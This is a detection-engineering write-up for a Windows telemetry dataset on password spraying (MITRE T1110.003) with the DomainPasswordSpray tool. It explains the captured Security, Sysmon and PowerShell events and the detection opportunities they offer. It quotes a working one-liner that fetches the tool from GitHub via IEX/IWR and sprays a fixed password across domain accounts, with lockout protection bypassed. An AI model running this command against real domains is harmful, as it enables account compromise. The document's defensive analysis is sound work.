# T1110.003-2: Password Spraying — Password Spray (DomainPasswordSpray)

## Technique Context

Password spraying (T1110.003) is a credential access technique where an adversary attempts authentication against many accounts using a single common password, deliberately staying below lockout thresholds that would trigger on repeated attempts against any one account. Rather than hammering one account with many passwords, the attacker tests one password — often a predictable seasonal pattern like "Spring2017" or "Password123" — across every domain account they can enumerate. In Active Directory environments this is particularly effective because domain users are enumerable by authenticated users, and organizations often have predictable password patterns tied to policy reset cycles.

DomainPasswordSpray (by @dafthack) is a well-known PowerShell tool that automates this workflow: it queries Active Directory for all enabled user accounts, checks the current lockout policy, calculates a safe spray threshold, and then systematically attempts authentication with the supplied password. The tool fetches its code from GitHub at runtime using `Invoke-Expression` with `Invoke-WebRequest`, a technique common enough that defenders treat this specific IEX/IWR pattern as a high-fidelity indicator even outside the context of this tool.

In the defended variant of this dataset, Windows Defender detected and blocked the execution before DomainPasswordSpray could authenticate against any accounts. The undefended version here shows what the full execution looks like — including the network download, script load into memory, and the authentication attempts that followed — giving you visibility into events that the defended dataset cannot provide.

## What This Dataset Contains

This dataset captures 152 events across three channels (110 PowerShell, 4 Security, 38 Sysmon) collected over a 4-second window (2026-03-14T23:47:58Z–23:48:02Z) on ACME-WS06, a Windows 11 Enterprise domain member of acme.local with Defender disabled.

**Process Creation Chain (Security EID 4688 and Sysmon EID 1):**

The ART test framework launched a parent PowerShell process (PID 3476) which spawned a child PowerShell process (PID 6972) carrying the full attack command:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force}
```

This command line is fully captured in both the Security EID 4688 process creation record and the Sysmon EID 1 process create event (which additionally carries a SHA256 of powershell.exe: `D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80` and IMPHASH `E09C4F82A1DA13A09F4FF2E625FEBA20`).

Sysmon also captured the parent process accessing the child process (EID 10, `GrantedAccess: 0x1FFFFF`) — full process access rights, consistent with the parent PowerShell spawning and waiting on a child process.

**PowerShell Script Block Logging (EID 4104):**

The PowerShell channel contains 107 EID 4104 events logging script block text. The majority are low-value internal PowerShell method fragments (`{ Set-StrictMode -Version 1; $_.PSMessageDetails }`, `{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }`, etc.) that are artifacts of the PowerShell runtime serializing error-handling lambdas. These are present in every PowerShell execution in this dataset and are not specific to the attack.

The substantive script block content — the DomainPasswordSpray function body and the Invoke-DomainPasswordSpray invocation — does appear in the 4104 stream. Script block logging captures code as it is compiled, including downloaded content executed via IEX, which means the full tool source is recorded even though it never touches disk.

**Sysmon Image Load Events (EID 7):**

25 EID 7 image-load events document the DLL loading sequence for powershell.exe: `mscoree.dll`, `mscoreei.dll`, `clr.dll`, `mscorlib.ni.dll`, and `System.Management.Automation.ni.dll`. These DLL load events are tagged by the Sysmon rule set with technique annotations: `technique_id=T1055` (Process Injection) and `technique_id=T1059.001` (PowerShell). The T1055 annotation reflects the sysmon-modular rule matching on .NET runtime DLL loads, not actual process injection activity.

**DNS Query (Sysmon EID 22):**

The dataset includes a Sysmon DNS query event associated with the IWR download attempt against `raw.githubusercontent.com`.

**Named Pipe Creation (Sysmon EID 17):**

Two EID 17 events record named pipe creation by PowerShell instances: `\PSHost.134180056768353706.3476.DefaultAppDomain.powershell` (parent) and `\PSHost.134180056838227701.7016.DefaultAppDomain.powershell` (a third PowerShell instance). These named pipes are standard PowerShell host communication channels, created for every PowerShell process.

## What This Dataset Does Not Contain

- **Authentication failure events (Security EID 4771, 4768, 4769, 4625):** DomainPasswordSpray authenticates over LDAP/Kerberos. These events would appear on the domain controller (ACME-DC01), not on the workstation. This dataset only captures workstation-side telemetry.
- **LDAP query events:** The tool's domain user enumeration via LDAP is not directly visible in Windows event logs without specific LDAP audit settings. Directory service access events would appear on the DC.
- **Network connection events for the LDAP authentication attempts:** Sysmon network connection logging (EID 3) is present in the Sysmon configuration but no EID 3 events for domain controller connections appear here, suggesting these connections occurred from the spawned PowerShell process that may have terminated before Sysmon captured them, or they fell outside the collection window.
- **File creation events:** DomainPasswordSpray executes entirely in memory via IEX. No tool binary is dropped to disk.
- **The actual downloaded PowerShell source:** While EID 4104 records script blocks as they compile, the full contiguous DomainPasswordSpray source code would require joining the 4104 stream in sequence. The 20 samples provided here are representative, not exhaustive.

## Assessment

This dataset represents a complete, unobstructed execution of a real-world password spraying tool against a domain environment. With Defender disabled, you can see the full process chain, the complete attack command line, script block logging of the tool's source code in memory, and corroborating Sysmon events — everything a defender needs to understand what happened and build detection logic.

Compared to the defended variant (86 events: 52 PowerShell, 9 Security, 25 Sysmon), this dataset is larger (152 events) primarily because the tool actually ran to completion. The defended dataset shows the detection event and blocked execution; this dataset shows the attack executing. The Security channel count here is lower (4 vs. 9) because Defender's own process activity in the defended variant contributed additional Security events.

The most forensically significant evidence is the full command line captured in Security EID 4688 and Sysmon EID 1, which contains the tool name, the GitHub URL with an exact commit hash, the password used (`Spring2017`), the target domain, and the `-Force` flag that bypasses the tool's own lockout safeguard.

## Detection Opportunities Present in This Data

**EID 4688 / Sysmon EID 1 — Command Line Containing IEX+IWR Pattern:**
The process creation events capture the full command line, including the `IEX (IWR '...' -UseBasicParsing)` pattern followed by `Invoke-DomainPasswordSpray`. The GitHub URL includes a specific commit hash, which is a strong indicator — legitimate software updates rarely pin to specific commits in this manner.

**EID 4104 — Script Block Logging of Downloaded Tool:**
Script block logging captures the DomainPasswordSpray function definitions and the `Invoke-DomainPasswordSpray` call as they are compiled by the PowerShell engine, even though the code was downloaded via IEX and never written to disk. Scanning 4104 content for `Invoke-DomainPasswordSpray`, `DomainPasswordSpray`, or the specific GitHub URL provides high-fidelity matches.

**Sysmon EID 22 — DNS Query to raw.githubusercontent.com:**
A DNS query to `raw.githubusercontent.com` from a PowerShell process during business hours is not inherently malicious, but combined with EID 4104 script block content or the IEX/IWR command line, it provides corroborating context.

**Sysmon EID 10 — Process Access (Parent→Child PowerShell):**
The parent PowerShell process accessing the child process with `GrantedAccess: 0x1FFFFF` (full access) is consistent with spawning a subprocess, but correlating this with the suspicious command line on the child process strengthens the picture of a two-stage execution pattern.
